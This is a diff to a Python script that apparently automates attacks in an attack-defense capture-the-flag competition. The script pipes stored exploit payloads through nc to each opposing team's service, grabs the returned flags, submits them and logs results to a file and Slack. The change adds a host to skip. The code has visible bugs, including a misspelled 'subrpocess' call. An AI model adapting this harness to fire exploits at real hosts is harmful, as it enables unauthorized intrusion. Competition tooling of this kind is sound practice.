@@ -128,38 +128,39 @@ def getSWPAGFlags (args):
             service_name = service['service_name']
             targets = t.get_targets(service['service_id'])
             for target in targets:
-                target_host = target['hostname']
-                target_port = target['port']
-                target_id = target['flag_id']
+                if target['hostname'] != args.ignoreHost: 
+                    target_host = target['hostname']
+                    target_port = target['port']
+                    target_id = target['flag_id']
 
-                payload = None
-                if service_name in services:
-                    payload = serviceExploits[service_name]
+                    payload = None
+                    if service_name in services:
+                        payload = serviceExploits[service_name]
 
-                # connect to target machine and send exploit
-                if payload is not None:
-                    f = open(args.logFile, "a")
-                    now = time.time()
-                    timestamp = datetime.fromtimestamp(now).strftime('%Y-%m-%d %H:%M:%S')
-                    f.write('Targeting ' + target['team_name'] + ' service ' + service_name)
-                    f.close()
-                    tc = connect(target_host, target_port)
-                    time.sleep(0.5)
-                    tc.shutdown(socket.SHUT_WR)
+                    # connect to target machine and send exploit
+                    if payload is not None:
+                        f = open(args.logFile, "a")
+                        now = time.time()
+                        timestamp = datetime.fromtimestamp(now).strftime('%Y-%m-%d %H:%M:%S')
+                        f.write('Targeting ' + target['team_name'] + ' service ' + service_name)
+                        f.close()
+                        tc = connect(target_host, target_port)
+                        time.sleep(0.5)
+                        tc.shutdown(socket.SHUT_WR)
 
-                    # Now read in flags
-                    subrpocess.call("function slowcat() { while read; do sleep .05; echo \"$REPLY\"; done;}", shell=True, executable='/bin/bash')
-                    data = subprocess.check_output(f"cat {payload} | slowcat | nc {target_host} {target_port}", shell=True, executable='/bin/bash')
-                    output = data.decode("utf-8")
-                    flag = output.replace("\n", "")
-                    result = t.submit_flag([flag])
-                    f = open(args.logFile, "a")
-                    now = time.time()
-                    timestamp = datetime.fromtimestamp(now).strftime('%Y-%m-%d %H:%M:%S')
-                    f.write('Tried to submit token for ' + target['team_name'] + ' got result ' + result)
-                    f.close()
-                    if args.slackChannel and args.slackToken:
-                        sendSlackMessage(args.slackChannel, args.slackToken, 'Submitted token for ' + target['team_name'] + ' got result: ' + result)
+                        # Now read in flags
+                        subrpocess.call("function slowcat() { while read; do sleep .05; echo \"$REPLY\"; done;}", shell=True, executable='/bin/bash')
+                        data = subprocess.check_output(f"cat {payload} | slowcat | nc {target_host} {target_port}", shell=True, executable='/bin/bash')
+                        output = data.decode("utf-8")
+                        flag = output.replace("\n", "")
+                        result = t.submit_flag([flag])
+                        f = open(args.logFile, "a")
+                        now = time.time()
+                        timestamp = datetime.fromtimestamp(now).strftime('%Y-%m-%d %H:%M:%S')
+                        f.write('Tried to submit token for ' + target['team_name'] + ' got result ' + result)
+                        f.close()
+                        if args.slackChannel and args.slackToken:
+                            sendSlackMessage(args.slackChannel, args.slackToken, 'Submitted token for ' + target['team_name'] + ' got result: ' + result)
 
 # Starts up the logging process, gets hosts, and then calls the runForever command
 def main(args):
